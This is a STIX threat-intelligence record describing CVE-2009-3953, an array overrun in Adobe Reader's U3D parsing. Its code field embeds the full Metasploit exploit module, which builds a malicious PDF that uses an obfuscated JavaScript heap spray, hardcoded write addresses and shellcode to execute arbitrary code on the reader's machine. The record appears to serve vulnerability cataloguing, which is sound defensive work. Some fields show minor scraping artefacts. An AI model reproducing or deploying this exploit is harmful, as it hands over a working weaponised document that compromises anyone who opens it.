{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e894cc7-3cf9-44db-a4b4-19716793fbea",
    "created": "2024-08-14T16:37:10.622442Z",
    "modified": "2024-08-14T16:37:10.622446Z",
    "name": "Adobe U3D CLODProgressiveMeshDeclaration Array Overrun",
    "description": " This module exploits an array overflow in Adobe Reader and Adobe Acrobat. Affected versions include < 7.1.4, < 8.2, and < 9.3. By creating a specially crafted pdf that a contains malformed U3D data, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_u3d_meshdecl.rb",
            "external_id": "adobe_u3d_meshdecl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3953"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb10-02.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe U3D CLODProgressiveMeshDeclaration Array Overrun',\n      'Description'    => %q{\n          This module exploits an array overflow in Adobe Reader and Adobe Acrobat.\n          Affected versions include < 7.1.4, < 8.2, and < 9.3. By creating a\n          specially crafted pdf that a contains malformed U3D data, an attacker may\n          be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Felipe Andres Manzano <felipe.andres.manzano[at]gmail.com>',\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3953' ],\n          [ 'OSVDB', '61690' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-02.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'\t => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # test results (on Windows XP SP3)\n          # reader 7.0.5 - untested\n          # reader 7.0.8 - untested\n          # reader 7.0.9 - untested\n          # reader 7.1.0 - untested\n          # reader 7.1.1 - untested\n          # reader 8.0.0 - untested\n          # reader 8.1.2 - works\n          # reader 8.1.3 - not working :-/\n          # reader 8.1.4 - untested\n          # reader 8.1.5 - untested\n          # reader 8.1.6 - untested\n          # reader 9.0.0 - untested\n          # reader 9.1.0 - works\n          [ 'Adobe Reader Windows Universal (JS Heap Spray)',\n            {\n              'Size'\t\t=> (6500/20),\n              'DataAddr'\t=> 0x09011020,\n              'WriteAddr'\t=> 0x7c49fb34,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2009-10-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n      ])\n\n  end\n\n\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Make some nops\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n=begin\n\nOriginal notes on heap technique used in this exploit:\n\n## PREPAREHOLES:\n## We will construct 6500*20 bytes long chunks starting like this\n## |0         |6   |8       |C        |24                    |size\n## |00000...  |0100|20100190|0000...  |    ......pad......   |\n##                 \\      \\\n##                 \\      \\ -Pointer: to controlled data\n##                   \\ -Flag: must be 1\n## -Adobe will handle this ragged structure if the Flag is on.\n## -Adobe will get 'what to write where' from the memory pointed\n##  by our supplied Pointer.\n##\n## then allocate a bunch of those ..\n## .. | chunk | chunk | chunk | chunck | chunk | chunck | chunck | ..\n##    |XXXXXXX|XXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXXX|\n##\n## and then free some of them...\n## .. | chunk | free  | chunk |  free  | chunk |  free  | chunck | ..\n##    |XXXXXXX|       |XXXXXXX|        |XXXXXXX|        |XXXXXXXX|\n##\n## This way controlling when the next 6500*20 malloc will be\n## followed with. We freed more than one hole so it became tolerant\n## to some degree of malloc/free trace noise.\n## Note the 6500 is arbitrary it should be a fairly unused chunk size\n## not big enough to cause a different type of allocation.\n## Also as we don't need to reference it from anywhere we don't care\n## where this hole layout is placed in memory.\n\n## PREPAREMEMORY:\n## In the next technique we make a big-chunk of 0x10000 bytes\n## repeating a 0x1000 bytes long mini-chunk of controled data.\n## Big-chunks are always allocated aligned to 0x1000. And if we\n## allocate a fair amount of big-chuncks (XPSPx) we'll be confident\n## Any 0x1000 aligned 0x1000 bytes from 0x09000000 to 0x0a000000\n## will have our mini chunk\n##\n## A mini-chunk will have this look\n##\n## |0         |10          |54         |?           |0xff0  |0x1000\n## |00000...  |  POINTERS  |    nops   | shellcode  |  pad  |\n##\n## So we control what is in 0x09XXXXXX. shellcode will be at 0x09XXX054+\n## But we use 0x09011064.\n## POINTERS looks like this:\n## ...\n\n=end\n\n    # prepare the hole\n    daddr = target['DataAddr']\n    hole_data = [0,0,1,daddr].pack('VvvV')\n    #padding\n    hole_data << \"\\x00\" * 24\n    hole = Rex::Text.to_unescape(hole_data)\n\n    # prepare ptrs\n    ptrs_data = [0].pack('V')\n    #where to write\n    ptrs_data << [target['WriteAddr'] / 4].pack('V')\n    #must be greater tan 5 and less than x for getting us where we want\n    ptrs_data << [6].pack('V')\n    #what to write\n    ptrs_data << [(daddr+0x10)].pack('V')\n    #autopointer for print magic(tm)\n    ptrs_data << [(daddr+0x14)].pack('V')\n    #function pointers for print magic(tm)\n    #pointing to our shellcode\n    ptrs_data << [(daddr+0x44)].pack('V') * 12\n    ptrs = Rex::Text.to_unescape(ptrs_data)\n\n    js_doc = <<-EOF\nfunction prepareHoles(slide_size)\n{\n  var size = 1000;\n  var xarr = new Array(size);\n  var hole = unescape(\"#{hole}\");\n  var pad = unescape(\"%u5858\");\n  while (pad.length <= slide_size/2 - hole.length)\n    pad += pad;\n  for (loop1=0; loop1 < size; loop1+=1)\n  {\n    ident = \"\"+loop1;\n    xarr[loop1]=hole + pad.substring(0,slide_size/2-hole.length);\n  }\n  for (loop2=0;loop2<100;loop2++)\n  {\n    for (loop1=size/2; loop1 < size-2; loop1+=2)\n    {\n      xarr[loop1]=null;\n      xarr[loop1]=pad.substring(0,0x10000/2 )+\"A\";\n      xarr[loop1]=null;\n    }\n  }\n  return xarr;\n}\n\nfunction prepareMemory(size)\n{\n  var mini_slide_size = 0x1000;\n  var slide_size = 0x100000;\n  var xarr = new Array(size);\n  var pad = unescape(\"%ucccc\");\n\n  while (pad.length <= 32 )\n    pad += pad;\n\n  var nops = unescape(\"#{nops}\");\n  while (nops.length <= mini_slide_size/2 - nops.length)\n    nops += nops;\n\n  var shellcode = unescape(\"#{shellcode}\");\n  var pointers = unescape(\"#{ptrs}\");\n  var chunk = nops.substring(0,32/2) + pointers +\n    nops.substring(0,mini_slide_size/2-pointers.length - shellcode.length - 32) +\n    shellcode + pad.substring(0,32/2);\n  chunk=chunk.substring(0,mini_slide_size/2);\n  while (chunk.length <= slide_size/2)\n    chunk += chunk;\n\n  for (loop1=0; loop1 < size; loop1+=1)\n  {\n    ident = \"\"+loop1;\n    xarr[loop1]=chunk.substring(16,slide_size/2 -32-ident.length)+ident;\n  }\n  return xarr;\n}\n\n  var mem = prepareMemory(200);\n  var holes = prepareHoles(6500);\n  this.pageNum = 1;\nEOF\n    js_pg1 = %Q|this.print({bUI:true, bSilent:false, bShrinkToFit:false});|\n\n    # Obfuscate it up a bit\n    js_doc = obfuscate_js(js_doc,\n      'Symbols' => {\n        'Variables' => %W{ slide_size size hole pad mini_slide_size nops shellcode pointers chunk mem holes xarr loop1 loop2 ident },\n        'Methods' => %W{ prepareMemory prepareHoles }\n      }).to_s\n\n    # create the u3d stuff\n    u3d = make_u3d_stream(target['Size'], rand_text_alpha(rand(28)+4))\n\n    # Create the pdf\n    pdf = make_pdf(u3d, js_doc, js_pg1)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n  end\n\n\n  def obfuscate_js(javascript, opts)\n    js = Rex::Exploitation::ObfuscateJS.new(javascript, opts)\n    js.obfuscate\n    return js\n  end\n\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\\n\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n  def u3d_pad(str, char=\"\\x00\")\n    ret = \"\"\n    if (str.length % 4) > 0\n      ret << char * (4 - (str.length % 4))\n    end\n    return ret\n  end\n\n\n  def make_u3d_stream(size, meshname)\n\n    # build the U3D header\n    hdr_data = [1,0].pack('n*') # version info\n    hdr_data << [0,0x24,31337,0,0x6a].pack('VVVVV')\n    hdr = \"U3D\\x00\"\n    hdr << [hdr_data.length,0].pack('VV')\n    hdr << hdr_data\n\n    # mesh declaration\n    decl_data = [meshname.length].pack('v')\n    decl_data << meshname\n    decl_data << [0].pack('V') # chain idx\n    # max mesh desc\n    decl_data << [0].pack('V') # mesh attrs\n    decl_data << [1].pack('V') # face count\n    decl_data << [size].pack('V') # position count\n    decl_data << [4].pack('V') # normal count\n    decl_data << [0].pack('V') # diffuse color count\n    decl_data << [0].pack('V') # specular color count\n    decl_data << [0].pack('V') # texture coord count\n    decl_data << [1].pack('V') # shading count\n    # shading desc\n    decl_data << [0].pack('V') # shading attr\n    decl_data << [0].pack('V') # texture layer count\n    decl_data << [0].pack('V') # texture coord dimensions\n    # no textore coords (original shading ids)\n    decl_data << [size+2].pack('V') # minimum resolution\n    decl_data << [size+3].pack('V') # final maximum resolution (needs to be bigger than the minimum)\n    # quality factors\n    decl_data << [0x12c].pack('V') # position quality factor\n    decl_data << [0x12c].pack('V') # normal quality factor\n    decl_data << [0x12c].pack('V') # texture coord quality factor\n    # inverse quantiziation\n    decl_data << [0].pack('V') # position inverse quant\n    decl_data << [0].pack('V') # normal inverse quant\n    decl_data << [0].pack('V') # texture coord inverse quant\n    decl_data << [0].pack('V') # diffuse color inverse quant\n    decl_data << [0].pack('V') # specular color inverse quant\n    # resource params\n    decl_data << [0].pack('V') # normal crease param\n    decl_data << [0].pack('V') # normal update param\n    decl_data << [0].pack('V') # normal tolerance param\n    # skeleton description\n    decl_data << [0].pack('V') # bone count\n    # padding\n    decl_pad = u3d_pad(decl_data)\n    mesh_decl = [0xffffff31,decl_data.length,0].pack('VVV')\n    mesh_decl << decl_data\n    mesh_decl << decl_pad\n\n    # build the modifier chain\n    chain_data = [meshname.length].pack('v')\n    chain_data << meshname\n    chain_data << [1].pack('V') # type (model resource)\n    chain_data << [0].pack('V') # attributes (no bounding info)\n    chain_data << u3d_pad(chain_data)\n    chain_data << [1].pack('V') # number of modifiers\n    chain_data << mesh_decl\n    modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV')\n    modifier_chain << chain_data\n\n    # mesh continuation\n    cont_data = [meshname.length].pack('v')\n    cont_data << meshname\n    cont_data << [0].pack('V') # chain idx\n    cont_data << [0].pack('V') # start resolution\n    cont_data << [0].pack('V') # end resolution\n    # no resolution update, unknown data follows\n    cont_data << [0].pack('V')\n    cont_data << [1].pack('V') * 10\n    mesh_cont = [0xffffff3c,cont_data.length,0].pack('VVV')\n    mesh_cont << cont_data\n    mesh_cont << u3d_pad(cont_data)\n\n    data = hdr\n    data << modifier_chain\n    data << mesh_cont\n\n    # patch the length\n    data[24,4] = [data.length].pack('V')\n\n    return data\n\n  end\n\n  def make_pdf(u3d_stream, js_doc, js_pg1)\n\n    xref = []\n    eol = \"\\x0a\"\n    obj_end = \"\" << eol << \"endobj\" << eol\n\n    # the header\n    pdf = \"%PDF-1.7\" << eol\n\n    # filename/comment\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n\n    # js stream (doc open action js)\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js_doc))\n    pdf << io_def(1) << n_obfu(\"<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << obj_end\n\n    # js stream 2 (page 1 annot js)\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js_pg1))\n    pdf << io_def(2) << n_obfu(\"<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << obj_end\n\n    # catalog\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Type/Catalog/Outlines \") << io_ref(4)\n    pdf << n_obfu(\"/Pages \") << io_ref(5)\n    pdf << n_obfu(\"/OpenAction \") << io_ref(8) << n_obfu(\">>\")\n    pdf << obj_end\n\n    # outline\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</Type/Outlines/Count 0>>\")\n    pdf << obj_end\n\n    # pages/kids\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<</Type/Pages/Count 2/Kids [\")\n    pdf << io_ref(10) << \" \" # empty page\n    pdf << io_ref(11) # u3d page\n    pdf << n_obfu(\"]>>\")\n    pdf << obj_end\n\n    # u3d stream\n    xref << pdf.length\n    pdf << io_def(6) << n_obfu(\"<</Type/3D/Subtype/U3D/Length %s>>\" % u3d_stream.length) << eol\n    pdf << \"stream\" << eol\n    pdf << u3d_stream << eol\n    pdf << \"endstream\"\n    pdf << obj_end\n\n    # u3d annotation object\n    xref << pdf.length\n    pdf << io_def(7) << n_obfu(\"<</Type/Annot/Subtype\")\n    pdf << \"/3D/3DA <</A/PO/DIS/I>>\"\n    pdf << n_obfu(\"/Rect [0 0 640 480]/3DD \") << io_ref(6) << n_obfu(\"/F 7>>\")\n    pdf << obj_end\n\n    # js dict (open action js)\n    xref << pdf.length\n    pdf << io_def(8) << n_obfu(\"<</Type/Action/S/JavaScript/JS \") + io_ref(1) + \">>\" << obj_end\n\n    # js dict (page 1 annot js)\n    xref << pdf.length\n    pdf << io_def(9) << n_obfu(\"<</Type/Action/S/JavaScript/JS \") + io_ref(2) + \">>\" << obj_end\n\n    # page 0 (empty)\n    xref << pdf.length\n    pdf << io_def(10) << n_obfu(\"<</Type/Page/Parent \") << io_ref(5) << n_obfu(\"/MediaBox [0 0 640 480]\")\n    pdf << n_obfu(\" >>\")\n    pdf << obj_end\n\n    # page 1 (u3d/print)\n    xref << pdf.length\n    pdf << io_def(11) << n_obfu(\"<</Type/Page/Parent \") << io_ref(5) << n_obfu(\"/MediaBox [0 0 640 480]\")\n    pdf << n_obfu(\"/Annots [\") << io_ref(7) << n_obfu(\"]\")\n    pdf << n_obfu(\"/AA << /O \") << io_ref(9) << n_obfu(\">>\")\n    pdf << n_obfu(\">>\")\n    pdf << obj_end\n\n    # xrefs\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n\n    # trailer\n    pdf << \"trailer\" << eol\n    pdf << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(3) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-13",
    "x_mitre_platforms": [
        "win'"
    ]
}